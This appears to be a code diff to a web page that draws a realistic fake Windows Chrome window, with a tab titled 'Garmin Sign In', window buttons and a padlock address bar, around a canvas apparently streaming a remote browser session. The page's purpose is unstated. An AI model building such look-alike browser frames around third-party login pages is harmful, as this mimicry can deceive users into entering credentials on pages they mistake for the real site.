@@ -95,36 +95,99 @@
       width: 100%;
       max-width: 1220px;
     }
-    .browser-chrome {
-      background: #16162A;
+    /* Windows Chrome tab bar */
+    .browser-tabbar {
+      background: #202035;
       border: 1px solid rgba(255,255,255,0.08);
       border-bottom: none;
       border-radius: 10px 10px 0 0;
-      padding: 0.55rem 0.85rem;
+      display: flex;
+      align-items: flex-end;
+      padding: 6px 0 0 8px;
+      gap: 0;
+    }
+    .browser-tab {
+      background: #16162A;
+      border: 1px solid rgba(255,255,255,0.08);
+      border-bottom: none;
+      border-radius: 8px 8px 0 0;
+      padding: 5px 36px 5px 12px;
+      font-size: 0.75rem;
+      color: #C0C4D8;
       display: flex;
       align-items: center;
-      gap: 0.65rem;
+      gap: 7px;
+      min-width: 160px;
+      position: relative;
     }
-    .browser-chrome .dots { display: flex; gap: 6px; }
-    .dot { width: 12px; height: 12px; border-radius: 50%; }
-    .dot-red   { background: #FF5F57; }
-    .dot-yel   { background: #FEBC2E; }
-    .dot-grn   { background: #28C840; }
+    .browser-tab svg { flex-shrink: 0; }
+    .tab-close {
+      position: absolute;
+      right: 8px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 16px; height: 16px;
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      color: #5A5F78;
+      font-size: 10px;
+      line-height: 1;
+    }
+    .win-controls {
+      margin-left: auto;
+      display: flex;
+      align-items: center;
+      padding-bottom: 4px;
+      padding-right: 4px;
+    }
+    .win-btn {
+      width: 46px; height: 30px;
+      display: flex; align-items: center; justify-content: center;
+      color: #8A90AA;
+      font-size: 10px;
+      cursor: default;
+      border-radius: 4px;
+      transition: background 0.1s;
+    }
+    .win-btn:hover { background: rgba(255,255,255,0.08); }
+    .win-btn.close:hover { background: #C42B1C; color: #fff; }
+    /* Address bar row */
+    .browser-chrome {
+      background: #16162A;
+      border-left: 1px solid rgba(255,255,255,0.08);
+      border-right: 1px solid rgba(255,255,255,0.08);
+      padding: 5px 8px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .chrome-btn {
+      width: 28px; height: 28px;
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      color: #5A6078;
+      flex-shrink: 0;
+    }
     #url-bar {
       flex: 1;
-      background: #0D0D1A;
+      background: #111120;
       border: 1px solid #2A2A46;
-      border-radius: 6px;
+      border-radius: 16px;
       color: #8A90AA;
       font-size: 0.78rem;
-      font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, monospace;
-      padding: 0.3rem 0.65rem;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      padding: 0.3rem 0.85rem;
       overflow: hidden;
       white-space: nowrap;
       text-overflow: ellipsis;
       pointer-events: none;
       user-select: none;
+      display: flex;
+      align-items: center;
+      gap: 6px;
     }
+    .url-lock { color: #5A6078; flex-shrink: 0; }
+    .url-text { overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
     .canvas-wrap {
       position: relative;
       background: #000;
@@ -237,13 +300,47 @@
 
   <!-- ── Browser viewer (shown after connect) ── -->
   <div id="browser-view">
-    <div class="browser-chrome">
-      <div class="dots">
-        <div class="dot dot-red"></div>
-        <div class="dot dot-yel"></div>
-        <div class="dot dot-grn"></div>
+    <!-- Windows Chrome tab bar -->
+    <div class="browser-tabbar">
+      <div class="browser-tab">
+        <!-- favicon placeholder -->
+        <svg width="14" height="14" viewBox="0 0 16 16" fill="none"><circle cx="8" cy="8" r="7" stroke="#5A6078" stroke-width="1.5"/><path d="M8 4v4l3 2" stroke="#5A6078" stroke-width="1.5" stroke-linecap="round"/></svg>
+        <span style="overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:120px" id="tab-title">Garmin Sign In</span>
+        <span class="tab-close">✕</span>
       </div>
-      <div id="url-bar">Connecting…</div>
+      <div class="win-controls">
+        <!-- Minimize -->
+        <div class="win-btn">
+          <svg width="10" height="1" viewBox="0 0 10 1"><rect width="10" height="1" fill="currentColor"/></svg>
+        </div>
+        <!-- Maximize -->
+        <div class="win-btn">
+          <svg width="10" height="10" viewBox="0 0 10 10"><rect x="0.5" y="0.5" width="9" height="9" rx="0" stroke="currentColor" fill="none"/></svg>
+        </div>
+        <!-- Close -->
+        <div class="win-btn close">
+          <svg width="10" height="10" viewBox="0 0 10 10"><path d="M1 1l8 8M9 1l-8 8" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg>
+        </div>
+      </div>
+    </div>
+    <!-- Address bar -->
+    <div class="browser-chrome">
+      <!-- back -->
+      <div class="chrome-btn">
+        <svg width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M10 3L5 8l5 5" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      </div>
+      <!-- forward -->
+      <div class="chrome-btn" style="opacity:0.3">
+        <svg width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M6 3l5 5-5 5" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      </div>
+      <!-- reload -->
+      <div class="chrome-btn">
+        <svg width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M13 8A5 5 0 1 1 8 3a5 5 0 0 1 3.54 1.46L13 6" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/><path d="M10 6h3V3" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      </div>
+      <div id="url-bar">
+        <svg class="url-lock" width="12" height="12" viewBox="0 0 12 12" fill="none"><rect x="2" y="5" width="8" height="6" rx="1" stroke="currentColor" stroke-width="1.2"/><path d="M4 5V4a2 2 0 0 1 4 0v1" stroke="currentColor" stroke-width="1.2"/></svg>
+        <span class="url-text" id="url-text">Connecting…</span>
+      </div>
     </div>
     <div class="canvas-wrap" id="canvas-wrap">
       <canvas id="garmin-canvas" tabindex="0"></canvas>
@@ -265,7 +362,7 @@
   const errorBanner  = document.getElementById("error-banner");
   const canvas       = document.getElementById("garmin-canvas");
   const canvasWrap   = document.getElementById("canvas-wrap");
-  const urlBar       = document.getElementById("url-bar");
+  const urlBar       = document.getElementById("url-text");
   const statusEl     = document.getElementById("browser-status");
   const successBanner = document.getElementById("success-banner");
   const ctx          = canvas.getContext("2d");
